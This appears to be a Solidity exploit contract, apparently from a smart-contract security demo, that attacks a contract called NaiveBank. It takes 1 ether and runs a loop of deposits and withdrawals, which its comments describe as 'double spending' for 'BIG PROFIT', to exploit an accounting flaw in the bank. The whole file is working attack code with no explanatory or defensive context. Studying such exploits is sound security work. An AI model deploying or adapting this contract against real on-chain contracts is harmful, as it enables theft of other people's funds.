//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface INaiveBank {
    function deposit() external payable;
    function withdraw(uint256 _withdrawAmount) external;
}

contract Attack {
    INaiveBank public immutable naiveBank;

    constructor(INaiveBank _naiveBank) {
        naiveBank = _naiveBank;
    }

    receive() external payable {
    }

    function attack(uint256 _xTimes) external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");

        for (uint256 i = 0; i < _xTimes - 1; i++) {
            // Do a double spending
            naiveBank.deposit{value: msg.value}();
            naiveBank.withdraw(msg.value);
        }

        // Do a final deposit and wait for the BIG PROFIT!!!
        naiveBank.deposit{value: msg.value}();
    }
}